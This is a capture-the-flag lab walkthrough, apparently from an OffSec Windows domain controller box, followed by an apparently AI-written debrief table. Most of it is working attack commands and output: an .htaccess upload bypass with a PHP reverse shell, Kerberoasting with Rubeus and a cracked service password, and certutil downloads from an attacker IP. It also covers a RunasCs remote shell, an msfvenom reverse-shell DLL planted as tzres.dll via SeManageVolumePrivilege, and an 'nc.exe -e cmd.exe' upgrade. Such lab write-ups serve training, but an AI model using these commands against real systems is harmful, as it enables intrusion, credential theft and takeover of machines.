@@ -1,0 +1,174 @@
+nmap found it is Domain Controller.
+
+Create a file named .htaccess with below content:
+AddType application/x-httpd-php .png
+Upload the .htaccess file
+Upload PHP Ivan Sincek from revshell, add GIF89a; at the beginning of file.
+
+PS C:\xampp\htdocs\uploads> whoami
+access\svc_apache
+PS C:\xampp\htdocs\uploads> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+PS C:\xampp\htdocs\uploads> .\Get-SPN.ps1
+Object Name =  krbtgt
+DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
+Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
+servicePrincipalNames
+SPN( 1 )   =       kadmin/changepw
+
+Object Name =  MSSQL
+DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
+Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
+servicePrincipalNames
+SPN( 1 )   =       MSSQLSvc/DC.access.offsec
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
+
+Id                   : uuid-b483b470-f3ef-4e0e-b118-f9e3aa853c7e-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 4/19/2026 6:08:22 AM
+ValidTo              : 4/19/2026 4:08:22 PM
+ServicePrincipalName : MSSQLSvc/DC.access.offsec
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+$ cp Rubeus.exe ~/offseclabs/rubeus.exe
+certutil -urlcache -split -f http://192.168.45.217:81/rubeus.exe
+.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+
+$ wget http://192.168.173.187/uploads/kerberoast.hashes
+trustno1
+
+certutil -urlcache -split -f http://192.168.45.217:81/Invoke-RunasCs.ps1
+Import-Module .\Invoke-RunasCs.ps1
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.217:443
+C:\>whoami
+access\svc_mssql
+
+C:\Windows\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
+
+certutil -urlcache -split -f http://192.168.45.217:81/SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=444 -f dll -o tzres.dll
+go to system32\wbem then replace tzres.dll.
+then run system info to get a new shell.
+C:\Windows\System32\wbem>certutil.exe -urlcache -split -f http://192.168.45.217:81/tzres.dll
+certutil.exe -urlcache -split -f http://192.168.45.217:81/tzres.dll
+****  Online  ****
+  0000  ...
+  2400
+CertUtil: -URLCache command completed successfully.
+
+C:\Windows\System32\wbem>systeminfo
+
+$ nc -nlvp 444
+C:\Windows\system32>whoami
+whoami
+nt authority\network service
+
+#############################################################################
+The Apache .htaccess Pivot (Most Likely)
+If the server is running Apache, it is currently configured to only execute files ending in .php. You need to change the rules for the current directory.
+upload .htaccess file 
+Now, visit shell.php.png. The server will see the .png extension, check the .htaccess file, and say, "Oh, I should run this through the PHP engine!"
+
+.\Get-SPN.ps1 found the svc_mssql account had registered Service Principal Names (SPNs). Use Rubeus.exe to get the hash, then crack it offline in Kali.
+
+
+Import-Module .\Invoke-RunasCs.ps1
+
+The SeManageVolumePrivilege in Windows allows a user to manage disk volumes, including tasks like formatting drives, creating new partitions, and assigning drive letters.
+By exploiting this vulnerability, we can escalate privileges by modifying the write permissions on C:\Windows\System32, making it writable. This allows us to perform DLL injection, potentially gaining higher system privileges.
+DLL Injection
+By injecting a malicious Dynamic Link Library (DLL) into a process with higher privileges, we can execute arbitrary code within that process’s context. If the targeted process is running as SYSTEM or another high-privilege user, this can result in privilege escalation, granting greater control over the system.
+Using dllref by Siren Security, we identified that tzres.dll is associated with systeminfo. Normally, running systeminfodisplays system details, but if we inject a malicious tzres.dll, we can hijack the process. This allows us to execute a reverse shell, leading to privilege escalation and higher system access.
+
+get-acl C:\Windows\System32\wbem | format-list # confirm a folder is writable.Look for your username in the output. If you see FullControl or Modify, the "vulnerability" is now active.
+
+#tzres.dll
+C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)
+
+------------------------------------------------------------------------------------------------------------------------
+Conclude:
+This lab is a fantastic example of a **Windows-based Apache chain**. You moved from a web vulnerability to Active Directory exploitation, and finally to a very specific Windows OS privilege escalation.
+
+Here is the thought process and tactical conclusion to help you digest this "hell level" challenge.
+
+---
+
+### 1. Thought Process & Breakthrough Confirmation
+
+| Attack Phase | Action | How to "Know" (The Trigger) | Confirmation of Success |
+| :--- | :--- | :--- | :--- |
+| **Foothold** | `.htaccess` + PNG Shell | Port 80 is running Apache on Windows (XAMPP). PHP is blocked, but you found a directory that allows file uploads. | Visit the `.png` URL. If it executes code instead of showing a broken image, the `.htaccess` successfully remapped the file type. |
+| **Internal Recon** | `Get-SPN.ps1` | You are on a Domain Controller (DC) as a low-priv service user (`svc_apache`). Standard enumeration (checking `groups` or `privs`) shows nothing, so you move to **AD-specific attacks**. | If `Get-SPN` returns an object with a `servicePrincipalName` (like `MSSQLSvc`), that account is **Kerberoastable**. |
+| **PrivEsc (Lateral)** | Kerberoasting + `RunasCs` | You found an SPN for `svc_mssql`. Since you can't reach the DB yet, you steal its "login ticket" (hash) to crack it. | Successfully cracking the hash in Hashcat confirms you have the password. Running `whoami` after `Invoke-RunasCs` confirms the user switch. |
+| **PrivEsc (Vertical)** | `SeManageVolume` + DLL Hijacking | `whoami /priv` shows `SeManageVolumePrivilege`. This is a rare but powerful privilege that often allows modifying system folders. | If you can successfully move/overwrite a file in `C:\Windows\System32\wbem`, the exploit worked. |
+| **System Access** | `tzres.dll` Hijack | You need a process that runs as a higher service (like Network Service) and looks for a missing DLL. `systeminfo` is a known target. | Receiving a connection on your `nc` listener after running `systeminfo` is the final confirmation. |
+
+
+
+---
+
+### 2. Deep Dive: Why these specific techniques?
+
+#### Why `.htaccess`?
+Normally, Windows servers use IIS (web.config). However, because this lab uses **XAMPP**, it uses **Apache**. Apache looks for `.htaccess` files to override folder rules. 
+* **The Rule:** If you have an upload folder on Apache that blocks `.php`, the very first thing you test is if you can upload a `.htaccess` to change the `AddType`.
+
+#### Why Kerberoasting?
+In an AD environment, if you have a shell but no clear path to Admin, Kerberoasting is the **low-hanging fruit**. It doesn't require high privileges to perform.
+* **The Rule:** Any account with an SPN (Service Principal Name) can have its ticket requested by **any** authenticated user in the domain.
+
+#### Why `tzres.dll`?
+This is a technique called **DLL Search Order Hijacking**. When `systeminfo.exe` runs, it looks for `tzres.dll`. If it doesn't find it in the "safe" locations, it looks in `C:\Windows\System32\wbem`. Since your exploit made that folder writable, you "planted" a fake DLL there.
+
+
+
+---
+
+### 3. Improving Shell Reaction (The "Lag" Issue)
+
+The slowness you felt is likely due to how **XAMPP/Apache** handles the PHP reverse shell on Windows. PHP shells on Windows are notoriously unstable and slow because they create a new process for every single command.
+
+**How to improve it:**
+1.  **Use a Better Shell:** Instead of a basic PHP reverse shell, use the PHP shell to execute a **PowerShell Empire** or **Metasploit HTTPS** stager if allowed.
+2.  **The "Netcat Upgrade":** As soon as you got the `svc_apache` shell, you should have uploaded a dedicated Windows `nc.exe` and triggered a *new* shell:
+    * `C:\uploads\nc.exe -e cmd.exe <KALI_IP> <PORT>`
+    * A native `.exe` shell is always faster than a PHP-wrapped shell.
+3.  **Check the Lab Location:** If you are in Singapore but the lab server is in the US/Europe, "Network Latency" is unavoidable. Using a native `nc.exe` shell helps mitigate this.
+
+---
+
+### 4. Summary for Review
+
+> **Key Takeaway:** This lab was a "Privilege Escalation Sandwich." 
+> 1. **Web** (Apache config) $\rightarrow$ 
+> 2. **AD** (Kerberos Hash) $\rightarrow$ 
+> 3. **OS** (Token/DLL Hijack).
+
+**Thought Process Conclusion:**
+"When I land on a Windows box as a service account, I check **Privileges** (`whoami /priv`) and **Environment** (Is it a DC? Is it Apache?). If it's a DC, I hunt for SPNs. If I have a weird privilege like `SeManageVolume`, I look for exploits that allow me to write to `System32`."
+
+**You’ve now handled a Silver Ticket (Nagoya) and a DLL Hijack (this lab). Between the two, which one felt more "logical" to you, and which one felt more like "magic"?**
+
+
